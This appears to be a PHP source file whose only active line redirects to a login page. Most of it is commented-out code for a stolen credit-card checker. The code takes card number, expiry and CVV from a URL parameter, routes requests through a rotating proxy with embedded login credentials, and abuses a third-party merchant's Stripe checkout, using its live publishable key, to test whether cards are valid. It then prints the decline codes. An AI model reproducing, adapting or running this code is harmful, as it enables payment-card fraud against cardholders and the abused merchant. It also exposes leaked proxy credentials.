
<?php

// $ccC=$_GET['cc'];

// $ccC=explode('|',$ccC);

// $cc=$ccC[0];
// $mes=$ccC[1];
// $anio=substr($ccC[2],2,4);
// $ccv=$ccC[3];

// $curl = curl_init();
// curl_setopt_array($curl, array(
//   CURLOPT_URL => 'https://intelephense.com/payment-intent',
//   CURLOPT_PROXY => 'socks5://p.webshare.io:80',
//   CURLOPT_PROXYUSERPWD => 'wfdmoeej-rotate:acog59a0zt9t',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 0,
//   CURLOPT_FOLLOWLOCATION => true,
//   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'currencyCode=USD&countryCode=US&regionCode=&quantity=1&email=joseffre76346732%40gmail.com&name=jose%20reyes&companyName=jose',
//   CURLOPT_HTTPHEADER => array(
//     'Content-Type: application/x-www-form-urlencoded'
//   ),
// ));

// $response = curl_exec($curl);

// curl_close($curl);

// $data = json_decode($response);
  
// //echo $data->secret;

// $porciones = explode("_", $data->secret);
// //echo $porciones[0]; // porción1



// $curl = curl_init();

// curl_setopt_array($curl, array(
//   CURLOPT_URL => 'https://api.stripe.com/v1/payment_intents/'.$porciones[0]."_".$porciones[1].'/confirm',
//   CURLOPT_PROXY => 'socks5://p.webshare.io:80',
//   CURLOPT_PROXYUSERPWD => 'wfdmoeej-rotate:acog59a0zt9t',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 0,
//   CURLOPT_FOLLOWLOCATION => true,
//   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
//   CURLOPT_CUSTOMREQUEST => 'POST',
//   CURLOPT_POSTFIELDS => 'receipt_email=joseffernandez457%40gmail.com&payment_method_data%5Btype%5D=card&payment_method_data%5Bbilling_details%5D%5Bname%5D=DANNY%2BGARCIA&payment_method_data%5Bcard%5D%5Bnumber%5D='.$cc.'&payment_method_data%5Bcard%5D%5Bcvc%5D='.$ccv.'&payment_method_data%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method_data%5Bcard%5D%5Bexp_year%5D='.$anio.'&payment_method_data%5Bguid%5D=NA&payment_method_data%5Bmuid%5D=NA&payment_method_data%5Bsid%5D=NA&payment_method_data%5Bpasted_fields%5D=number&payment_method_data%5Bpayment_user_agent%5D=stripe.js%2Fb5d6cae0f%3B%2Bstripe-js-v3%2Fb5d6cae0f&payment_method_data%5Btime_on_page%5D=83993&payment_method_data%5Breferrer%5D=https%3A%2F%2Fintelephense.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_6U93nvAmMOJ2jBI2GPIwE2Qk00BToqeDYE&client_secret='.$data->secret,
//   CURLOPT_HTTPHEADER => array(
//     'Content-Type: application/x-www-form-urlencoded'
//   ),
// ));

// $response = curl_exec($curl);

// curl_close($curl);

// $data = json_decode($response);

// if(!empty($data->error)){
//     if(!empty($data->error->decline_code)){
//         $resp=array();
//         array_push($resp,array(""=>""));
//         echo $data->error->decline_code.'<br>';
//     }
//     echo $data->error->code.'<br>';
//     echo $data->error->message;
// }else{
//     echo $response;
// }

// //echo $response;
// // $curl = curl_init('http://ipv4.webshare.io/');
// // curl_setopt($curl, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
// // curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'wfdmoeej-rotate:acog59a0zt9t');
// // curl_exec($curl);



header("Location: vistas/login.php");


?>